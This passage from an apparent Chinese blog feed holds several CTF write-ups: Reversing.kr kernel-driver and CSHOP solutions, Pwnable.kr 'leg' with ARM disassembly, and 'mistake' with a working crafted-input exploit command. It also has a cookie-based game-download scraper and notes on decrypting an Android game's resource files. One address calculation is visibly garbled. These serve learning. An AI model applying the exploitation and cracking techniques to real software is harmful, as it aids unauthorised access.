##### 合并前清空output_file的内容   #####        fp=open(self.output_file,&#39;wb&#39;)        i=1        while True:            temp_output=os.path.join(self.dir_name,&quot;output&quot;+str(i))            if not os.path.exists(temp_output):                break            ##### 读取分块内容，依次附加到output_file  #####            print &quot;write chunk&quot;, i            tp=open(temp_output,&quot;rb&quot;)            buf = tp.read(1024 * 1024)            fp.write(buf)            tp.close()            i += 1        fp.close()    #打印进度    def progress(self,download_total,downloaded,uploaded_total,upload):        print &quot;To be downloaded&quot; + str(download_total)        print &quot;Downloaded : &quot; + str(downloaded)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写爬虫时要下载文件，谁知道文件比较大，然后在下载时候总是丢包，因此参考网上的一些源码写了实现分块下载的功能,有能力的童鞋可以自己改写成多线程的。&lt;br&gt;这个pycurl的分块下载功能我把它封装成了一个类，直接使用即可,接收5个参数,用法如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;    d = downloader(downloadurl,out_filePath,None,None,None)
    d.download() #调用下载功能下载
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="python" scheme="http://shxi.me/categories/python/"/>
    
    
  </entry>
  
  <entry>
    <title>Reversing.kr Windows kernal</title>
    <link href="http://shxi.me/posts/2bf6b638.html"/>
    <id>http://shxi.me/posts/2bf6b638.html</id>
    <published>2016-03-06T03:21:40.000Z</published>
    <updated>2018-04-04T16:57:40.426Z</updated>
    
    <content type="html"><![CDATA[<p>运行程序看看，要输入数据之前要先点击按钮Enable<br><img src="http://t.cn/RGQPldt" alt=""><br>然后按钮变成Check，这时就可以输入字符，输入正确的字符就会弹出正确的提示。<br><img src="http://t.cn/RGQPYcX" alt=""><br><a id="more"></a><br>用IDA载入程序，在sub_401110函数中就是对输入字符串判断的关键函数。<br><img src="http://t.cn/RGQPTGH" alt=""><br>来到关键call，这段代码是用户模式下的程序与驱动进行交互。对字符串验证的逻辑肯定是在驱动文件里了。<br><img src="http://t.cn/RGQPHAF" alt=""></p><p>IDA载入驱动文件分析驱动<br><img src="http://t.cn/RGQPQLd" alt=""></p><p>注册了两个派遣例程，sub_11288 函数是DeviceIoControl，处理用户模式与该驱动的交互。</p><p>这里我们可以看到这里处理DeviceIoControlCode 为 0x1000 和 0x2000。再看前面sub_401110函数的代码，我们可以知道<br>程序刚开始运行时，编辑框不能输入任何数据，点击Enable,发送0x1000到驱动，按钮变成check,编辑框就能用了，这时就可以输入字符了。<br>再点击check，就发送0x2000到驱动验证结果对不对。</p><p>sub_112F8函数代码<br><img src="http://t.cn/RGQhP35" alt=""></p><p>驱动还使用KeInitializeDpc函数注册了一个定时器，每隔一段时间就运行sub_11266函数。<br>在这个函数里，看到一个函数 READ_PORT_UCHAR，这个函数通过端口号来读取输入的字节。然后在下面的这个函数sub_111DC中验证，<br><img src="http://t.cn/RGQGHdX" alt=""></p><p>既然验证代码在内核中，那我们就需要用winDBG来调试驱动了。<br>在WinDBG中使用lm命令查找所有加载的模块。WinKer就是我们程序加载的驱动。<br><img src="http://t.cn/RGQPRcM" alt=""></p><p>用!drvobj WinKer命令来看 WinKer驱动的信息。<br><img src="http://t.cn/RGQPEOr" alt=""><br>下面列出了个设备对象列表，点击87bc0650，你也可以手动输入命令!devobj 87bc0650。<br>这里这个驱动对象的地址是87bc0780，找到了驱动对象的地址，我们就可以使用dt来查看它的数据结构了。<br><img src="http://t.cn/RGQh7iL" alt=""></p><p>还记得前面说的sub_11288函数的三个派遣函数么，派遣函数的地址存放在MajorFunction数组了，我们可以通过这个地址找到对于的函数，来进行调试。</p><p>sub_11288 为MajorFunction第e个数组，因此可以通过计算87bc0780+0x38+0xe*4得到改内存的值知道这个函数的内存地址为93316288。<br><img src="http://t.cn/RGQhzqI" alt=""></p><p>前面我们已经知道 验证代码在sub_11266(00011266)函数处，通过计算可以知道该函数在内存中的地址 93316288-11288 + 00011166 = 933161DC66 。这个函数就是验证地方。在这个地方下断就可以调试了。<br>不过有一个问题就是 在程序编辑框输入数据后这里会被断下两次,由此可知没输入一个字符，调用两次这个函数。</p><p>通过 READ_PORT_UCHAR函数读取用户输入的数据。READ_PORT_UCHAR每一次只读取一个字节，而g_var变量也在随着变化，分析流程图我们可以得知g_var全局变量为输入字符在字符串的位置。READ_PORT_UCHAR读取从0到3位 返回的值分别是 0xa5u,0x92u,0x95u,0xbu<br><img src="http://t.cn/RGQhnkB" alt=""><br>当等于7是g_var+100= 107，没有这个分支，进入默认分支进入sub_11156函数。<br><img src="http://t.cn/RGQ7j3U" alt=""><br>同上类似，READ_PORT_UCHAR读取的是从4到6位,返回的值分别是：0xb2u，0x85u，0xa3u。 g_var值变成200，第三个swith同样。<br><img src="http://t.cn/RGQ7TVT" alt=""></p><p>只要将你输入的字符和READ_PORT_UCHAR返回的字符对应起来，就可以得到正确的key。要知道READ_PORT_UCHAR的返回值,还是得用winDBG来调试。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;运行程序看看，要输入数据之前要先点击按钮Enable&lt;br&gt;&lt;img src=&quot;http://t.cn/RGQPldt&quot; alt=&quot;&quot;&gt;&lt;br&gt;然后按钮变成Check，这时就可以输入字符，输入正确的字符就会弹出正确的提示。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGQPYcX&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr leg</title>
    <link href="http://shxi.me/posts/c240cede.html"/>
    <id>http://shxi.me/posts/c240cede.html</id>
    <published>2016-02-15T09:10:06.000Z</published>
    <updated>2018-04-04T16:57:40.411Z</updated>
    
    <content type="html"><![CDATA[<p>先看题目提供的源码；<br><img src="http://t.cn/RGROoB4" alt=""></p><p>分析后知道只要我们输入的key等于key()、key2()和key3()的值的和就能得到flag。</p><pre><code class="cpp">key1()+key2()+key3()) == key </code></pre><a id="more"></a><p>这三个函数都是内嵌的汇编。我们在来看题目提供的 gdb反汇编的代码。</p><p><strong>key1()</strong></p><pre><code class="bash">(gdb) disass key1                                                              Dump of assembler code for function key1:                                         0x00008cd4 &lt;+0&gt;:     push    {r11}           ; (str r11, [sp, #-4]!)           0x00008cd8 &lt;+4&gt;:     add     r11, sp, #0                                       0x00008cdc &lt;+8&gt;:     mov     r3, pc                                            0x00008ce0 &lt;+12&gt;:    mov     r0, r3                                            0x00008ce4 &lt;+16&gt;:    sub     sp, r11, #0                                       0x00008ce8 &lt;+20&gt;:    pop     {r11}           ; (ldr r11, [sp], #4)             0x00008cec &lt;+24&gt;:    bx      lr                                             End of assembler dump.                                                         </code></pre><p>关键部分：</p><pre><code class="bash">   0x00008cdc &lt;+8&gt;:     mov     r3, pc                                            0x00008ce0 &lt;+12&gt;:    mov     r0, r3 </code></pre><p>arm汇编是以r0作为函数的返回值的，pc的值为当前地址+8 即0x00008cdc+ 8</p><p><strong>key2()</strong></p><pre><code class="bash">(gdb) disass key2                                                           Dump of assembler code for function key2:                                      0x00008cf0 &lt;+0&gt;:     push    {r11}           ; (str r11, [sp, #-4]!)        0x00008cf4 &lt;+4&gt;:     add     r11, sp, #0                                    0x00008cf8 &lt;+8&gt;:     push    {r6}            ; (str r6, [sp, #-4]!)         0x00008cfc &lt;+12&gt;:    add     r6, pc, #1                                     0x00008d00 &lt;+16&gt;:    bx      r6                                             0x00008d04 &lt;+20&gt;:    mov     r3, pc                                         0x00008d06 &lt;+22&gt;:    adds    r3, #4                                         0x00008d08 &lt;+24&gt;:    push    {r3}                                           0x00008d0a &lt;+26&gt;:    pop     {pc}                                           0x00008d0c &lt;+28&gt;:    pop     {r6}            ; (ldr r6, [sp], #4)           0x00008d10 &lt;+32&gt;:    mov     r0, r3                                         0x00008d14 &lt;+36&gt;:    sub     sp, r11, #0                                    0x00008d18 &lt;+40&gt;:    pop     {r11}           ; (ldr r11, [sp], #4)          0x00008d1c &lt;+44&gt;:    bx      lr                                          End of assembler dump.                                                      </code></pre><p>关键部分：</p><pre><code class="bash">   0x00008d00 &lt;+16&gt;:    bx      r6                                             0x00008d04 &lt;+20&gt;:    mov     r3, pc                                         0x00008d06 &lt;+22&gt;:    adds    r3, #4      ......   0x00008d10  &lt;+32&gt;:   mov r0, r3          </code></pre><p>r6 = 0x00008cfc + 8 +1 = 0x00008d04。 bx r6在r6地址处切换成thumb模式。在thumb模式下pc = 当前地址+4。r0 =r3 = 0x00008d04 +4+4</p><p><strong>key3()</strong></p><pre><code class="bash">(gdb) disass key3                                                             Dump of assembler code for function key3:                                        0x00008d20 &lt;+0&gt;:     push    {r11}           ; (str r11, [sp, #-4]!)          0x00008d24 &lt;+4&gt;:     add     r11, sp, #0                                      0x00008d28 &lt;+8&gt;:     mov     r3, lr                                           0x00008d2c &lt;+12&gt;:    mov     r0, r3                                           0x00008d30 &lt;+16&gt;:    sub     sp, r11, #0                                      0x00008d34 &lt;+20&gt;:    pop     {r11}           ; (ldr r11, [sp], #4)            0x00008d38 &lt;+24&gt;:    bx      lr                                            End of assembler dump.                                                        </code></pre><p>关键部分</p><pre><code class="bash">   0x00008d28 &lt;+8&gt;:     mov     r3, lr                                           0x00008d2c &lt;+12&gt;:    mov     r0, r3  </code></pre><p>r0等于lr即key3()函数的返回地址0x00008d80。<br>最后得到的值全部相加就得108400。<br><img src="http://t.cn/RGRO9tC" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先看题目提供的源码；&lt;br&gt;&lt;img src=&quot;http://t.cn/RGROoB4&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分析后知道只要我们输入的key等于key()、key2()和key3()的值的和就能得到flag。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;cpp&quot;&gt;key1()+key2()+key3()) == key 
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="challenge" scheme="http://shxi.me/categories/challenge/"/>
    
    
      <category term="Pwnable" scheme="http://shxi.me/tags/Pwnable/"/>
    
  </entry>
  
  <entry>
    <title>Reversing.kr CSHOP</title>
    <link href="http://shxi.me/posts/1bb8fcd6.html"/>
    <id>http://shxi.me/posts/1bb8fcd6.html</id>
    <published>2016-02-15T08:43:09.000Z</published>
    <updated>2018-04-04T16:57:40.423Z</updated>
    
    <content type="html"><![CDATA[<p>CSHOP为C#编写的程序,运行改程序<br><img src="http://t.cn/RGRNJgI" alt=""><br>窗口什么东西也没有，拖进dnspy分析源码。在源码中，程序定义了一个按钮和几个标签。注册了一个按钮事件就没有其他了。</p><a id="more"></a><p>但是我们在运行的窗口中并没有看到按钮，如果仔细再看下源码，你就会发现如下图的代码。<br><img src="http://t.cn/RGRNXt4" alt=""><br>这个button的大小被设置成0了。难怪我们看不到了。我们修改此处的IL指令，修改0的值。这里我就改成20 和30了。<br><img src="http://t.cn/RGRNScy" alt=""></p><p>修改完成后，点击File-SaveAll保存所有的修改，文件名需要和拖进dnspy的文件 不一样。因为后者是被占用无法修改。<br><img src="http://t.cn/RGRNCUJ" alt=""><br>打开修改后的文件，点击按钮就会在下面出现flag。<br><img src="http://t.cn/RGRNp74" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CSHOP为C#编写的程序,运行改程序&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRNJgI&quot; alt=&quot;&quot;&gt;&lt;br&gt;窗口什么东西也没有，拖进dnspy分析源码。在源码中，程序定义了一个按钮和几个标签。注册了一个按钮事件就没有其他了。&lt;/p&gt;
    
    </summary>
    
      <category term="challenge" scheme="http://shxi.me/categories/challenge/"/>
    
    
      <category term="Reversing" scheme="http://shxi.me/tags/Reversing/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫实战:Oculus VR</title>
    <link href="http://shxi.me/posts/84f4a8fe.html"/>
    <id>http://shxi.me/posts/84f4a8fe.html</id>
    <published>2016-02-15T02:41:09.000Z</published>
    <updated>2018-04-14T09:35:06.962Z</updated>
    
    <content type="html"><![CDATA[<p>帮朋友写的一个爬虫，爬一个网站的所有VR游戏。在这之前我都还不知道还有这个VR(虚拟现实)游戏。我也是通过写这个爬虫才学会pycurl+BeautifulSoup 的用法。</p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>我使用的是第三方模块pycurl+BeautifulSoup。需要另外安装这两个模块，不然脚本无法运行，会报错。</p><p><strong>BeautifulSoup</strong>:<a href="http://beautifulsoup.readthedocs.org/zh_CN/latest/#" title="中文文档" target="_blank" rel="noopener">中文文档</a><br><strong>pycurl</strong>:<a href="http://pycurl.sourceforge.net/download/" title="下载地址" target="_blank" rel="noopener">下载地址</a>选择对应的版本下载安装。</p><h2 id="开始编写爬虫"><a href="#开始编写爬虫" class="headerlink" title="开始编写爬虫"></a>开始编写爬虫</h2><p>开始之前我们先分析下我们需要爬的内容。我们要的是每个游戏的真实下载地址。</p><p><img src="http://t.cn/RGRNRtu" alt=""></p><p>既然是下载所有的游戏，我们就得知道每一页的网址，在这里 <a href="http://d.87870.com/xiazai-2-0603-1_.html" target="_blank" rel="noopener">http://d.87870.com/xiazai-2-0603-1_.html</a> ，<br>xiazai-2 这里的2是页数，知道了总页数我们就可以爬出所有页的每个游戏点击立即下载后跳转到的游戏下载页面。<br><img src="http://t.cn/RGRNni7" alt=""><br>如上图，点击游戏下载就可以下载游戏。但是没有登录的话是不让你下载的，这就要我们写脚本时要用到cookie。<br><img src="http://t.cn/RGRNusg" alt=""></p><p>大概思路就是这样了。开始写代码。<br><a id="more"></a><br>我用pycurl封装了一个函数</p><pre><code class="python">def GetData(url, ProxyIP=None,reffer=None,cookie=None):    b = StringIO.StringIO()    c = pycurl.Curl()    c.setopt(pycurl.WRITEFUNCTION, b.write)    c.setopt(pycurl.USERAGENT, &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0&quot;)    c.setopt(pycurl.URL, url)    if ProxyIP:        c.setopt(pycurl.PROXY,ProxyIP)    if cookie:        c.setopt(pycurl.COOKIEFile,cookiefile) #使用 firebug导出的cookie文件    if reffer:        c.setopt(pycurl.REFERER,reffer)    c.perform()    return b.getvalue()</code></pre><p>用来获取网络数据，</p><h3 id="获取总页数"><a href="#获取总页数" class="headerlink" title="获取总页数"></a>获取总页数</h3><p>使用firebug分析游戏目录页最下方的页数，html代码如下。</p><pre><code class="html">&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt;  &lt;div class=&quot;pageNav&quot;&gt;    &lt;a href=&quot;xiazai-1-0603-1_.html&quot;&gt;首页&lt;/a&gt;    &lt;a href=&quot;xiazai-7-0603-1_.html&quot;&gt;上一页&lt;/a&gt;    &lt;a href=&quot;xiazai-3-0603-1_.html&quot;&gt;3&lt;/a&gt;    &lt;a href=&quot;xiazai-4-0603-1_.html&quot;&gt;4&lt;/a&gt;    &lt;a href=&quot;xiazai-5-0603-1_.html&quot;&gt;5&lt;/a&gt;    &lt;a href=&quot;xiazai-6-0603-1_.html&quot;&gt;6&lt;/a&gt;    &lt;a href=&quot;xiazai-7-0603-1_.html&quot;&gt;7&lt;/a&gt;    &lt;a class=&quot;current&quot;&gt;8&lt;/a&gt;    &lt;a href=&quot;xiazai-9-0603-1_.html&quot;&gt;9&lt;/a&gt;    &lt;a href=&quot;xiazai-10-0603-1_.html&quot;&gt;10&lt;/a&gt;    &lt;a href=&quot;xiazai-11-0603-1_.html&quot;&gt;11&lt;/a&gt;    &lt;a href=&quot;xiazai-12-0603-1_.html&quot;&gt;12&lt;/a&gt;    &lt;a href=&quot;xiazai-9-0603-1_.html&quot;&gt;下一页&lt;/a&gt;    &lt;a href=&quot;xiazai-60-0603-1_.html&quot;&gt;尾页&lt;/a&gt;    &lt;em&gt;共60页&lt;/em&gt;   &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>总页数就是60页，编写python代码如下：</p><pre><code class="python">def GetPageCount(url):    data = GetData(url)    soup = BeautifulSoup(data)    da = soup.select(&#39;.pageNav&#39;)    page = re.findall(u&quot;共(.*?)页&quot;, da[0].text)[0]    return page</code></pre><h2 id="获取游戏下载页面"><a href="#获取游戏下载页面" class="headerlink" title="获取游戏下载页面"></a>获取游戏下载页面</h2><p>现在已经知道有多少页了，随便找一页查看html源码。</p><pre><code class="html"> &lt;li&gt;&lt;a href=&quot;xiazainr-6299.html&quot; target=&quot;_blank&quot; title=&quot;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&quot;&gt;                                        &lt;img src=&quot;http://pic.87870.com/upload/images/vr87870/2015/9/16/th_170x170_339d0126-f4c3-44f4-921e-0ff9f57534cb.jpg&quot; alt=&quot;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&quot;&gt;                                        &lt;/a&gt;                                        &lt;div class=&quot;content&quot;&gt;                                            &lt;p class=&quot;title&quot;&gt;&lt;a href=&quot;xiazainr-6299.html&quot; target=&quot;_blank&quot; title=&quot;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&quot;&gt;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&lt;/a&gt;&lt;/p&gt;                                            &lt;p&gt;2015-09-16 | 633.85M&lt;/p&gt;                                            &lt;p&gt;类型：Oculus Rift适配&lt;/p&gt;                                            &lt;p&gt;适配：Oculus DK2&lt;/p&gt;                                            &lt;p&gt;外设：无&lt;/p&gt;                                            &lt;p class=&quot;link&quot;&gt;                                                下载方式：免费                                            &lt;/p&gt;                                            &lt;a href=&quot;xiazainr-6299.html&quot; class=&quot;download_btn&quot; target=&quot;_blank&quot;&gt;立即下载&lt;/a&gt;                                        &lt;/div&gt;                                    &lt;/li&gt;                                    &lt;li&gt;&lt;a href=&quot;xiazainr-6296.html&quot; target=&quot;_blank&quot; title=&quot;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&quot;&gt;                                        &lt;img src=&quot;http://pic.87870.com/upload/images/vr87870/2015/9/16/th_170x170_dbc06a5e-4e19-4c81-a457-1f9c2353f59e.jpg&quot; alt=&quot;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&quot;&gt;                                        &lt;/a&gt;                                        &lt;div class=&quot;content&quot;&gt;                                            &lt;p class=&quot;title&quot;&gt;&lt;a href=&quot;xiazainr-6296.html&quot; target=&quot;_blank&quot; title=&quot;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&quot;&gt;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&lt;/a&gt;&lt;/p&gt;                                            &lt;p&gt;2015-09-16 | 821.64M&lt;/p&gt;                                            &lt;p&gt;类型：单机&lt;/p&gt;                                            &lt;p&gt;适配：Oculus Rift&lt;/p&gt;                                            &lt;p&gt;外设：无&lt;/p&gt;                                            &lt;p class=&quot;link&quot;&gt;                                                下载方式：60幸福币                                            &lt;/p&gt;                                            &lt;a href=&quot;xiazainr-6296.html&quot; class=&quot;download_btn&quot; target=&quot;_blank&quot;&gt;立即下载&lt;/a&gt;                                        &lt;/div&gt;                                    &lt;/li&gt;</code></pre><p>发现游戏下载页面都在这个位置，</p><pre><code class="html">&lt;a href=&quot;xiazainr-6296.html&quot; class=&quot;download_btn&quot; target=&quot;_blank&quot;&gt;立即下载&lt;/a&gt;</code></pre><p>编写代码如下：</p><pre><code class="python">def GetGameDownloadPage(url):    DownloadPageList = []    data = GetData(url)    soup = BeautifulSoup(data)    da   = soup.select(&quot;.download_btn&quot;)    for u in da:        DownloadPageList.append(&#39;http://d.87870.com/&#39;+u[&#39;href&#39;])    return DownloadPageList</code></pre><p>每一页有很多游戏，返回这一页所有游戏的下载页面。</p><p>游戏下载页面的源码如下：</p><pre><code class="html">&lt;div class=&quot;topic relative&quot;&gt;                    &lt;h1&gt;恐怖医院(THE HOSPITAL HAUNTED BE LOST)&lt;/h1&gt;                    &lt;div class=&quot;comment relative&quot;&gt;                        &lt;i&gt;&lt;/i&gt;                        &lt;p class=&quot;overflow&quot;&gt;小编简评：《恐怖医院（THE HOSPITAL HAUNTED BE LOST）》是由MAD虚拟现实工作室开发，这个团队来自泰国最古老且最有名望的私立大学&amp;mdash;&amp;mdash;泰国斯巴顿大学。该工作室将泰国本土恐怖元素和VR游戏融合在一起，光从恐怖惊悚氛围上已经达到了上乘之作。                        &lt;/p&gt;                    &lt;/div&gt;                    &lt;div class=&quot;info&quot;&gt;                        &lt;p&gt;                            游戏类型：&lt;strong class=&quot;fd3939&quot;&gt;Oculus DK2&lt;/strong&gt;游戏大小：&lt;strong class=&quot;fd3939&quot;&gt;366.69M&lt;/strong&gt;适配眼镜：&lt;strong class=&quot;fd3939&quot;&gt;DK2&lt;/strong&gt;                        &lt;/p&gt;                        &lt;p&gt;                            操作系统：&lt;strong class=&quot;fd3939&quot;&gt;Windows7&lt;/strong&gt;更新时间：&lt;strong class=&quot;fd3939&quot;&gt;2016-04-13&lt;/strong&gt; 下载方式：60幸福币                        &lt;/p&gt;                    &lt;/div&gt;                    &lt;div class=&quot;for_download clearfix&quot;&gt;                        &lt;a class=&quot;download&quot; href=&quot;http://d.87870.com/dl.aspx?id=9972&quot;&gt;游戏下载&lt;/a&gt;</code></pre><p>游戏下载地址在最后一行。访问这个地址会重定向到游戏的真实下载地址。</p><pre><code class="python"># 得到游戏的下载地址def GetGameDownloadURL(pageURL):    data = GetData(pageURL)    soup = BeautifulSoup(data)    try:        da = soup.select(&quot;.download&quot;)    except Exception,e:        pass    return da[0][&#39;href&#39;]</code></pre><p>直接使用pycurl下载游戏时会丢包，因为文件比较大，需要pycurl分块下载。最后main函数如下，我只是获取了每个游戏的真实下载地址。</p><pre><code class="python">def main():    downloadPageList = []    count = GetPageCount(&#39;http://d.87870.com/xiazai-1-0603-1_.html&#39;)    #获取所有页的游戏下载页面    for page in range(1,int(count)):        url = &#39;http://d.87870.com/xiazai-%d-0603-1_.html&#39;% page        downloadPageList.extend(GetGameDownloadPage(url))    for u in downloadPageList:        downurl = GetGameDownloadURL(u)        data = GetData(downurl,reffer=u)        if &quot;store.steampowered.com&quot; in data:            continue        GameURL = re.findall(&#39;&lt;a href=\&quot;(.*?)\&quot;&gt;here&#39;,data,re.S)[0]</code></pre><p>最后附上完整的代码：<a href="https://github.com/ydc1992/pytho-script/blob/master/VR%282%29.py" title="github" target="_blank" rel="noopener">github</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;帮朋友写的一个爬虫，爬一个网站的所有VR游戏。在这之前我都还不知道还有这个VR(虚拟现实)游戏。我也是通过写这个爬虫才学会pycurl+BeautifulSoup 的用法。&lt;/p&gt;
&lt;h2 id=&quot;安装模块&quot;&gt;&lt;a href=&quot;#安装模块&quot; class=&quot;headerlink&quot; title=&quot;安装模块&quot;&gt;&lt;/a&gt;安装模块&lt;/h2&gt;&lt;p&gt;我使用的是第三方模块pycurl+BeautifulSoup。需要另外安装这两个模块，不然脚本无法运行，会报错。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BeautifulSoup&lt;/strong&gt;:&lt;a href=&quot;http://beautifulsoup.readthedocs.org/zh_CN/latest/#&quot; title=&quot;中文文档&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;中文文档&lt;/a&gt;&lt;br&gt;&lt;strong&gt;pycurl&lt;/strong&gt;:&lt;a href=&quot;http://pycurl.sourceforge.net/download/&quot; title=&quot;下载地址&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载地址&lt;/a&gt;选择对应的版本下载安装。&lt;/p&gt;
&lt;h2 id=&quot;开始编写爬虫&quot;&gt;&lt;a href=&quot;#开始编写爬虫&quot; class=&quot;headerlink&quot; title=&quot;开始编写爬虫&quot;&gt;&lt;/a&gt;开始编写爬虫&lt;/h2&gt;&lt;p&gt;开始之前我们先分析下我们需要爬的内容。我们要的是每个游戏的真实下载地址。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://t.cn/RGRNRtu&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;既然是下载所有的游戏，我们就得知道每一页的网址，在这里 &lt;a href=&quot;http://d.87870.com/xiazai-2-0603-1_.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://d.87870.com/xiazai-2-0603-1_.html&lt;/a&gt; ，&lt;br&gt;xiazai-2 这里的2是页数，知道了总页数我们就可以爬出所有页的每个游戏点击立即下载后跳转到的游戏下载页面。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRNni7&quot; alt=&quot;&quot;&gt;&lt;br&gt;如上图，点击游戏下载就可以下载游戏。但是没有登录的话是不让你下载的，这就要我们写脚本时要用到cookie。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRNusg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;大概思路就是这样了。开始写代码。&lt;br&gt;
    
    </summary>
    
      <category term="python" scheme="http://shxi.me/categories/python/"/>
    
    
      <category term="爬虫" scheme="http://shxi.me/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr mistake</title>
    <link href="http://shxi.me/posts/f6e7b5bf.html"/>
    <id>http://shxi.me/posts/f6e7b5bf.html</id>
    <published>2016-01-31T15:34:20.000Z</published>
    <updated>2018-04-04T16:57:40.434Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://t.cn/RGRNYlx" alt=""></p><p>分析源码，发现下面这段代码有点可疑。</p><pre><code>fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code></pre><p>熟悉Linux的童鞋都知道文件描述符是不可能小于0的。计算得fd等于0，因为”&lt;”比”=”优先级高，先计算等式右边，打开的文件描述符不可能小于0，因此右边等式等于0，最后fd=0；<br>文件描述符为0是标准输入，也就是说这个程序实际上并没有读取password文件，而是从标准输入中读取数据。</p><p>继续往下看，有个比较，两个buff相等则输出flag。</p><pre><code class="cpp">if(!strncmp(pw_buf, pw_buf2, PW_LEN)){           printf(&quot;Password OK\n&quot;);                 system(&quot;/bin/cat flag\n&quot;);         }                                          </code></pre><p>这样，我们只要构造一个满足条件的buffer通过管道传给mistake。buffer满足下面这个条件就能成功拿到key。</p><pre><code class="c">pw_buf = pw_buf2^0x1111111111</code></pre><p>执行如下命令。</p><pre><code class="bash">(python -c &quot;print &#39;\x12&#39;*10 + &#39;\x13&#39;*10 &quot;) | ./mistake</code></pre><p><img src="http://t.cn/RGRNH93" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://t.cn/RGRNYlx&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分析源码，发现下面这段代码有点可疑。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fd=open(&amp;quot;/home/mistake/password&amp;quot;,O_RDONLY,0400)
      
    
    </summary>
    
      <category term="challenge" scheme="http://shxi.me/categories/challenge/"/>
    
    
      <category term="Pwnable" scheme="http://shxi.me/tags/Pwnable/"/>
    
  </entry>
  
  <entry>
    <title>安卓游戏资源解密</title>
    <link href="http://shxi.me/posts/9e24c54e.html"/>
    <id>http://shxi.me/posts/9e24c54e.html</id>
    <published>2016-01-31T12:11:59.000Z</published>
    <updated>2018-04-04T16:57:40.443Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安卓游戏资源解密"><a href="#安卓游戏资源解密" class="headerlink" title="安卓游戏资源解密"></a>安卓游戏资源解密</h1><p>一个同学在群里发了个游戏，要解密游戏的资源。反编译看了下源码，没看出什么，用Android Killer看了下资源，发现在res/raw目录下有个文件比较大，t0.zip解压后有t0.pak;文件有点大，3M多，并且是以PAK格式的文 件，通过搜索得知这个格式为PAK格式——是一种文件打包的格式。</p><p><img src="http://t.cn/RGRCrxm" alt=""></p><p>在网上搜了下 打开PAK文件的软件，发现都不能打开。  搞不定就不搞了。</p><p>这几天看了 &lt;&lt;揭秘数据解密的关键技术&gt;&gt;，下面图片框框内的像文件名，我们可以知道这个文件是一种文件打包的格式。具体是什么结构不知道。<br><img src="http://t.cn/RGRCgpS" alt=""></p><a id="more"></a><p>解析文件推荐使用010 editor，写文件解析模板方便分析。</p><p>我们可以看出第一个文件名从0xA开始， 对比每个文件名，发现名字前面的一字节数据表示这个文件名字符串的长度，前面8个字符未知，每两个字符串之间差8个数据，我们可以利用010 editor的模板功能写一个模板文件。</p><p>前8字节的数据暂时定义成结构</p><pre><code class="c"> typedef struct unkown{    char  unk[8];}</code></pre><p>包含文件名的数据定义成</p><pre><code class="bash">typedef struct{     BYTE  FilenameLen;     char  Filename[nameLen];     char  unkonw[8];   //未知数据}FILE_LIST;</code></pre><p><img src="http://t.cn/RGRCkDz" alt=""></p><p>找到最后一个文件名的字符串</p><p><img src="http://t.cn/RGRNhLS" alt=""></p><p>然后不断的改变模板文件中i的值计算总共有多少个文件名，最后算出有总共有292个文件名。发现开头的四字节数据刚好为292，因此可以判断该数据为文件的个数。模板文件改写代码</p><pre><code class="bash">typedef struct{int FileNum;int unk;}PAK;typedef struct{     BYTE  nameLen;     char  name[nameLen];     CHAR  unk[8];}FILE_LIST;/////////////////////////////LittleEndian();PAK pak;FSeek(0x8);local int i;for(i=0;i&lt;pak.FileNum;i++){    FILE_LIST fileList;  };</code></pre><p>继续分析最后一个文件名后面的数据。后面的数据的起止地址0x2D80h.<br><img src="http://t.cn/RqtewpY" alt=""></p><p><img src="http://t.cn/RqteUgm" alt=""></p><p>而第一个FileList结构(模板文件定义的那个结构)的unk字段的第一个4字节为0x2d80;可以判断Unk的前四个字节为偏移地址，比较 多个FileLidy结构，可以发现相邻两个FIleList结构的 unk字段的前4字节刚好就是相邻两个FileList结构unk字段指向的数据之差。</p><p>模板文件现在修改为</p><pre><code class="cpp">typedef struct{      int fileNum;      int unknow2;    }PAK;typedef struct{     BYTE  nameLen;     char  name[nameLen];     